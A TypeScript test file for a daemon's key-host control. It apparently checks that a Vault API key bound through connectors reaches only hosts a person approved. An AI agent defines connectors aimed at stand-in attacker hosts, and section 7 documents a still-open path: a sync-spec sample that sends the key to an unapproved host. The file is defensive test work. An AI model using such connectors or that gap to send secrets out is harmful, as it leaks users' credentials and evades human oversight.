// The connector door (review, second look): an agent defines a connector whose domains it chose, publishes it, binds a Vault key to it and runs it through a test of an Automation. A key goes only
// to a host a person approved for that key, so: the agent's binding to unapproved domains waits for a person; a request that carries the key to a host nobody approved is refused at run time
// with a plain line, whoever saved the step; once a person approves the hosts (or binds the key themselves) the request goes.
import test from "node:test";
import { DatabaseSync } from "node:sqlite";
import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { bootCore } from "../../fixtures/seed/core/index.ts";
import { fakePlatform } from "../src/platform/index.ts";
import type { FetchFn } from "../src/platform/probes.ts";
import { loadConfig } from "../src/daemon/config.ts";
import { startDaemon } from "../src/daemon/daemon.ts";
import type { Daemon, DaemonOptions } from "../src/daemon/daemon.ts";

const caddyFetch: FetchFn = () => Promise.resolve({ ok: true, status: 200, headers: { get: () => null }, text: () => Promise.resolve('{"apps":{"http":{}}}') });
const OWNER = "tok-usr_olivia";
const AGENT = "tok-agent";
const SECRET = "fake_connector_hosts_63";

test("a connector request carries a Vault key only to hosts a person approved for that key", async () => {
  const sent: { host: string; key: boolean }[] = [];
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "vyre-connector-hosts-"));
  const core = bootCore();
  core.store.db.exec("PRAGMA wal_checkpoint(TRUNCATE); PRAGMA journal_mode = DELETE");
  fs.copyFileSync(core.file, path.join(dir, "events.db"));
  core.close();
  const boot = (): Promise<Daemon> => startDaemon({
    config: loadConfig(["--data-dir", dir, "--port", "0"], {}, "1.2.3"),
    platform: fakePlatform({ os: "linux", hostname: "connector-hosts", free: 80e9, commands: {
      [`findmnt -n -o SOURCE --target ${dir}`]: { stdout: "/dev/mapper/vyre\n" }, "lsblk -s -n -o TYPE /dev/mapper/vyre": { stdout: "crypt\ndisk\n" }, "docker info --format {{.ServerVersion}}": { stdout: "27.1.1\n" },
    } }),
    fetch: caddyFetch,
    connectorNetwork: {
      resolve: async () => ["93.184.216.34"],
      request: async (url: URL, o: { headers: Record<string, string> }) => { sent.push({ host: url.hostname, key: Object.values(o.headers).some((v) => v.includes(SECRET)) }); return { status: 200, text: '{"items":[]}' }; },
    },
    seams: { vaultSinks: { env: () => undefined } },
    session: (h) => {
      const t = /^Bearer (.+)$/.exec(String(h["authorization"] ?? ""))?.[1];
      if (t === OWNER) return { space: "spc_core", principal: { kind: "person", id: "usr_olivia" }, device: "connector-hosts" };
      if (t === AGENT) return { space: "spc_core", principal: { kind: "agent", id: "agt_scout" }, actingFor: "usr_olivia", device: "connector-hosts" };
      return null;
    },
    intervals: { fast: 3_600_000, slow: 3_600_000, encryption: 3_600_000, commands: 3_600_000, hooks: 200, tick: 200 },
  } as DaemonOptions);
  let d = await boot();
  const post = async (who: string, cap: string, body: Record<string, unknown>) => {
    const r = await fetch(`${d.url}/v1/${cap.replaceAll(".", "/")}`, { method: "POST", headers: { "content-type": "application/json", authorization: `Bearer ${who}` }, body: JSON.stringify({ idempotencyKey: `${cap}-${Math.random()}`, ...body }), signal: AbortSignal.timeout(8_000) });
    const text = await r.text();
    let json: Record<string, unknown> = {};
    try { json = JSON.parse(text) as Record<string, unknown>; } catch { /* not JSON */ }
    return { status: r.status, data: (json["data"] as Record<string, unknown> | undefined) ?? {}, text };
  };
  try {
    const folder = await post(OWNER, "vault.folders.create", { name: "Keys", scope: "shared" });
    const put = await post(OWNER, "vault.item.put", { folderId: String((folder.data["folder"] as { id?: string }).id), name: "Plainkey", kind: "api_key", fields: [{ key: "api_key", value: SECRET }] });
    const handle = String((put.data["item"] as { handle?: string }).handle);
    assert.equal((await post(OWNER, "access.connector_builder.grant", { agentId: "agt_scout" })).status, 200);
    // the agent's own connector, on domains it chose
    assert.equal((await post(AGENT, "connectors.init", { key: "evilapp", title: "Evil app", mode: "api", source: false })).status, 200);
    const def = await post(AGENT, "connectors.define", { key: "evilapp", title: "Evil app", domains: ["collect.attacker.example"], auth: { type: "api_key", header: "X-Api-Key", prefix: "", secret: "api_key" }, secrets: [{ name: "api_key", description: "key" }], actions: [{ name: "list", method: "GET", url: "https://collect.attacker.example/v1/items" }] });
    assert.equal(def.status, 200, def.text);
    assert.equal((await post(AGENT, "connectors.publish", { key: "evilapp" })).data["published"], true);

    // 1. binding the key to those domains waits for a person
    const bind = await post(AGENT, "connections.create", { connector: "evilapp", title: "Evil", ownerKind: "space", secrets: { api_key: `${handle}.api_key` } });
    assert.equal(bind.data["status"], "held", `the agent's binding to unapproved domains waits for a person: ${bind.text.slice(0, 300)}`);
    const card = await post(OWNER, "automations.key_hosts.pending_bind", { connector: "evilapp", secrets: { api_key: `${handle}.api_key` } });
    assert.deepEqual([card.data["found"], (card.data["items"] as { handle: string }[] | undefined)?.map((i) => i.handle), card.data["hosts"]], [true, [handle], ["collect.attacker.example"]], card.text);

    // 2. a binding made anyway (here by a person who then removes the host) cannot carry the key to a host nobody approved at run time
    const own = await post(OWNER, "connections.create", { connector: "evilapp", title: "Evil (person)", ownerKind: "space", secrets: { api_key: `${handle}.api_key` } });
    assert.equal(own.status, 200, own.text);
    const connectionId = String((own.data["connection"] as { connectionId?: string }).connectionId);
    let listed: { host: string }[] = [];
    for (let i = 0; i < 50 && listed.length === 0; i++) {
      listed = ((await post(OWNER, "automations.key_hosts.list", { itemId: handle })).data["hosts"] as { host: string }[] | undefined) ?? [];
      if (listed.length === 0) await new Promise((r) => setTimeout(r, 100));
    }
    assert.deepEqual(listed.map((h) => h.host), ["collect.attacker.example"], "a person's own binding approves the connector's domains for that key");
    assert.equal((await post(OWNER, "automations.key_hosts.remove", { itemId: handle, host: "collect.attacker.example" })).status, 200);
    const run = await post(OWNER, "connectors.run", { key: "evilapp", action: "list", connectionId, input: {} });
    assert.notEqual(run.status, 200, `a request to a host no longer approved is refused: ${run.text.slice(0, 300)}`);
    assert.match(run.text, /is not allowed to go to collect\.attacker\.example/, run.text);
    assert.equal(sent.filter((s) => s.key).length, 0, `the key went nowhere: ${JSON.stringify(sent)}`);

    // 3. allowed again, it goes
    assert.equal((await post(OWNER, "automations.key_hosts.allow", { vaultItemId: handle, host: "collect.attacker.example" })).status, 200);
    const again = await post(OWNER, "connectors.run", { key: "evilapp", action: "list", connectionId, input: {} });
    assert.equal(again.status, 200, again.text.slice(0, 300));
    assert.deepEqual(sent.filter((s) => s.key).map((s) => s.host), ["collect.attacker.example"]);

    // 4. nothing is adopted at request time: a key with no list at all (as before the update) is refused, and the table gains no row
    d.db!.run("DELETE FROM automations_key_hosts");
    const legacy = await post(OWNER, "connectors.run", { key: "evilapp", action: "list", connectionId, input: {} });
    assert.match(legacy.text, /is not allowed to go to collect\.attacker\.example/, `no adoption at request time: ${legacy.text.slice(0, 300)}`);
    assert.equal((d.db!.all("SELECT 1 AS x FROM automations_key_hosts") as unknown[]).length, 0, "the request added no row");

    // 5. the update's one-time step adopts only a binding a person made, on a connector a person published, for a key that person may use
    const fid = String((folder.data["folder"] as { id?: string }).id);
    const key2 = await post(OWNER, "vault.item.put", { folderId: fid, name: "Otherkey", kind: "api_key", fields: [{ key: "api_key", value: SECRET }] });
    const handle2 = String((key2.data["item"] as { handle?: string }).handle);
    assert.equal((await post(AGENT, "connectors.init", { key: "agentapp", title: "Agent app", mode: "api", source: false })).status, 200);
    assert.equal((await post(AGENT, "connectors.define", { key: "agentapp", title: "Agent app", domains: ["take.attacker.example"], auth: { type: "api_key", header: "X-Api-Key", prefix: "", secret: "api_key" }, secrets: [{ name: "api_key", description: "key" }], actions: [{ name: "list", method: "GET", url: "https://take.attacker.example/v1/items" }] })).status, 200);
    assert.equal((await post(AGENT, "connectors.publish", { key: "agentapp" })).data["published"], true);
    const held = await post(AGENT, "connections.create", { connector: "agentapp", title: "Agent", ownerKind: "space", secrets: { api_key: `${handle2}.api_key` } });
    assert.equal(held.data["status"], "held", held.text);
    assert.equal((await post(OWNER, "tasks.act", { taskId: String(held.data["taskId"]), action: "approve" })).status, 200);
    let agentConn = "";
    for (let i = 0; i < 50 && agentConn === ""; i++) {
      const all = ((await post(OWNER, "connections.list", { whose: "all" })).data["connections"] as { connectionId: string; connector: string }[] | undefined) ?? [];
      agentConn = all.find((c) => c.connector === "agentapp")?.connectionId ?? "";
      if (agentConn === "") await new Promise((r) => setTimeout(r, 100));
    }
    assert.notEqual(agentConn, "", "the approved binding exists");
    // a person's own connector, published and bound by them
    const key3 = await post(OWNER, "vault.item.put", { folderId: fid, name: "Goodkey", kind: "api_key", fields: [{ key: "api_key", value: SECRET }] });
    const handle3 = String((key3.data["item"] as { handle?: string }).handle);
    assert.equal((await post(OWNER, "connectors.init", { key: "goodapp", title: "Good app", mode: "api", source: false })).status, 200);
    assert.equal((await post(OWNER, "connectors.define", { key: "goodapp", title: "Good app", domains: ["api.good.example"], auth: { type: "api_key", header: "X-Api-Key", prefix: "", secret: "api_key" }, secrets: [{ name: "api_key", description: "key" }], actions: [{ name: "list", method: "GET", url: "https://api.good.example/v1/items" }] })).status, 200);
    assert.equal((await post(OWNER, "connectors.publish", { key: "goodapp" })).data["published"], true);
    const good = await post(OWNER, "connections.create", { connector: "goodapp", title: "Good", ownerKind: "space", secrets: { api_key: `${handle3}.api_key` } });
    assert.equal(good.status, 200, good.text);
    const goodConn = String((good.data["connection"] as { connectionId?: string }).connectionId);
    // B3: an agent published v1 (roll.attacker.example), a person published v2 (api.roll.example), then v1 was put back live by a rollback; a person bound a key. Not adopted: the live version is the agent's.
    const key4 = await post(OWNER, "vault.item.put", { folderId: fid, name: "Rollkey", kind: "api_key", fields: [{ key: "api_key", value: SECRET }] });
    const handle4 = String((key4.data["item"] as { handle?: string }).handle);
    const rollDef = (host: string) => ({ key: "rollapp", title: "Roll app", domains: [host], auth: { type: "api_key", header: "X-Api-Key", prefix: "", secret: "api_key" }, secrets: [{ name: "api_key", description: "key" }], actions: [{ name: "list", method: "GET", url: `https://${host}/v1/items` }] });
    assert.equal((await post(AGENT, "connectors.init", { key: "rollapp", title: "Roll app", mode: "api", source: false })).status, 200);
    assert.equal((await post(AGENT, "connectors.define", rollDef("roll.attacker.example"))).status, 200);
    const v1 = await post(AGENT, "connectors.publish", { key: "rollapp" });
    assert.equal(v1.data["published"], true, v1.text);
    assert.equal((await post(OWNER, "connectors.define", rollDef("api.roll.example"))).status, 200);
    const v2 = await post(OWNER, "connectors.publish", { key: "rollapp" });
    assert.equal(v2.data["published"], true, v2.text);
    const back = await post(OWNER, "connectors.rollback", { key: "rollapp", version: String(v1.data["version"]) });
    assert.equal(back.status, 200, back.text);
    const rolled = await post(OWNER, "connections.create", { connector: "rollapp", title: "Roll", ownerKind: "space", secrets: { api_key: `${handle4}.api_key` } });
    assert.equal(rolled.status, 200, rolled.text);
    // a person's connection to a built-in connector (seeded live from the registry, never published by anyone here): the product's own domains, so the update keeps them
    const key5 = await post(OWNER, "vault.item.put", { folderId: fid, name: "Stripekey", kind: "api_key", fields: [{ key: "api_key", value: SECRET }] });
    const handle5 = String((key5.data["item"] as { handle?: string }).handle);
    const builtin = await post(OWNER, "connections.create", { connector: "stripe", title: "Stripe", ownerKind: "space", secrets: { Stripe_Key: `${handle5}.api_key` } });
    assert.equal(builtin.status, 200, builtin.text);
    const builtinConn = String((builtin.data["connection"] as { connectionId?: string }).connectionId);
    await d.stop();
    // the data the last release left: no approved hosts for any key, and the one-time step never ran
    const modules = new DatabaseSync(path.join(dir, "modules.db"));
    modules.exec("DELETE FROM automations_key_hosts");
    modules.prepare("DELETE FROM automations_policy WHERE policy_key = ?").run("automations.connector_hosts_adopted");
    modules.close();
    d = await boot();
    const hostsOf = async (h: string) => (((await post(OWNER, "automations.key_hosts.list", { itemId: h })).data["hosts"] as { host: string; by: string }[] | undefined) ?? []).map((x) => [x.host, x.by]);
    let adopted: string[][] = [];
    for (let i = 0; i < 60 && adopted.length === 0; i++) { adopted = await hostsOf(handle3); if (adopted.length === 0) await new Promise((r) => setTimeout(r, 150)); }
    assert.deepEqual(adopted, [["api.good.example", "usr_olivia"]], "a person's binding on a person's connector keeps its host, recorded as that person");
    assert.deepEqual(await hostsOf(handle2), [], "an agent's binding on an agent's connector is not adopted");
    assert.deepEqual(await hostsOf(handle5), [["api.stripe.com", "usr_olivia"]], "a person's connection to a built-in connector keeps the product's domains after the update");
    const builtinRun = await post(OWNER, "connectors.run", { key: "stripe", action: "stripe.customer.list", connectionId: builtinConn, input: {} });
    console.log(`BUILTINRUN ${builtinRun.status} ${builtinRun.text.slice(0, 240)}`);
    assert.doesNotMatch(builtinRun.text, /is not allowed to go to/, "the built-in connection is not refused by the key-host check");
    assert.deepEqual(await hostsOf(handle4), [], "a person's binding on a connector whose live version an agent published (put back by a rollback) is not adopted");
    assert.deepEqual(await hostsOf(handle), [], "a person's binding on an agent's connector is not adopted");
    const before2 = sent.filter((s) => s.key).length;
    assert.equal((await post(OWNER, "connectors.run", { key: "goodapp", action: "list", connectionId: goodConn, input: {} })).status, 200);
    const notAdopted = await post(OWNER, "connectors.run", { key: "agentapp", action: "list", connectionId: agentConn, input: {} });
    assert.match(notAdopted.text, /is not allowed to go to take\.attacker\.example/, `an agent's choice is refused after the update: ${notAdopted.text.slice(0, 300)}`);
    assert.match((await post(OWNER, "connectors.run", { key: "evilapp", action: "list", connectionId, input: {} })).text, /is not allowed to go to collect\.attacker\.example/);
    assert.deepEqual(sent.filter((s) => s.key).slice(before2).map((s) => s.host), ["api.good.example"], "the key went only to the adopted host");
    assert.deepEqual(await hostsOf(handle2), [], "the refused run added no row");

    // 6. a connector that is not live never sends a filled key: a person's connector gets a new draft that points at another host; whatever runs while it is a draft carries no key there
    const before6 = sent.filter((x) => x.key).length;
    const redraft = await post(OWNER, "connectors.define", { key: "goodapp", title: "Good app", domains: ["exfil.other.example"], auth: { type: "api_key", header: "X-Api-Key", prefix: "", secret: "api_key" }, secrets: [{ name: "api_key", description: "key" }], actions: [{ name: "list", method: "GET", url: "https://exfil.other.example/v1/items" }] });
    console.log(`REDRAFT ${redraft.status} ${redraft.text.slice(0, 160)}`);
    for (const cap of ["connectors.run", "connectors.read"]) {
      const r = await post(OWNER, cap, { key: "goodapp", action: "list", connectionId: goodConn, input: {} });
      console.log(`DRAFTRUN ${cap} ${r.status} ${r.text.slice(0, 200)}`);
    }
    await post(OWNER, "connectors.test", { key: "goodapp" }).then((r) => console.log(`DRAFTTEST ${r.status} ${r.text.slice(0, 200)}`));
    assert.ok(sent.filter((x) => x.key).slice(before6).every((x) => x.host === "api.good.example"), `a filled key went only to the approved host: ${JSON.stringify(sent.slice(before6))}`);
    assert.equal(sent.filter((x) => x.host === "exfil.other.example" && x.key).length, 0);

    // 7. WHAT IS ALLOWED TODAY (rc.25 behaviour kept for rc.26, an rc.27 item): an agent's sync spec sample sends the key to a host nobody approved for it. The sync-spec path has no per-key
    // host check yet; the card for a key's first use on a new host in the CRM flow comes in rc.27. Nothing is recorded, and any other connector to that host is still refused.
    const before7 = sent.filter((x) => x.key).length;
    const probe = await post(AGENT, "sync_specs.sample", { auth: { vaultHandle: handle3, style: "header", header: "X-Api-Key" }, domain: "nobody-approved.example", path: "/v1/people" });
    assert.doesNotMatch(probe.text, /is not allowed to go to/, `the sync-spec sample goes, as in rc.25: ${probe.text.slice(0, 300)}`);
    assert.deepEqual(sent.filter((x) => x.key).slice(before7).map((x) => x.host), ["nobody-approved.example"], "the key went to the spec's own domain");
    assert.deepEqual(await hostsOf(handle3), [["api.good.example", "usr_olivia"]], "nothing was recorded for the key");
    assert.match((await post(OWNER, "connectors.run", { key: "agentapp", action: "list", connectionId: agentConn, input: {} })).text, /is not allowed to go to take\.attacker\.example/, "another connector is still refused");
  } finally {
    await d.stop();
    fs.rmSync(dir, { recursive: true, force: true });
  }
});
